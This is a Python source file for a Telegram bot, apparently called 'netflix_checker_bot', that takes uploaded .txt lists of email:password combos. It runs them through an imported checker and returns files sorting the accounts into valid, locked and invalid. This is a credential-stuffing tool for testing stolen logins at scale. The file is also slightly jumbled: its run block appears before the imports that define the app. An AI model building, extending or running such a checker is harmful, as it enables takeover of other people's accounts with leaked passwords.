if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
import os
from flask import Flask, request
from pyrogram import Client, filters
from pyrogram.types import Message
from checker import check_accounts

API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")

app = Flask(__name__)
bot = Client("netflix_checker_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.route("/webhook", methods=["POST"])
def webhook():
    update = request.get_json()
    bot.process_update(update)
    return "ok"

@bot.on_message(filters.document & filters.private)
async def handle_file(_, message: Message):
    if not message.document.file_name.endswith(".txt"):
        await message.reply("Please upload a .txt file with email:password combos.")
        return

    path = await message.download()
    with open(path, "r") as f:
        combos = [line.strip() for line in f if ":" in line]

    await message.reply("Checking accounts, please wait...")

    results = check_accounts(combos)
    valid, invalid, locked = results["valid"], results["invalid"], results["locked"]

    text = f"✅ Valid: {len(valid)}\n❌ Invalid: {len(invalid)}\n🔒 Locked: {len(locked)}"

    result_file = "results.txt"
    with open(result_file, "w") as f:
        f.write("[VALID ACCOUNTS]\n" + "\n".join(valid) + "\n\n")
        f.write("[LOCKED ACCOUNTS]\n" + "\n".join(locked) + "\n\n")
        f.write("[INVALID ACCOUNTS]\n" + "\n".join(invalid))

    await message.reply_document(result_file, caption=text)
    os.remove(path)
    os.remove(result_file)

bot.start()
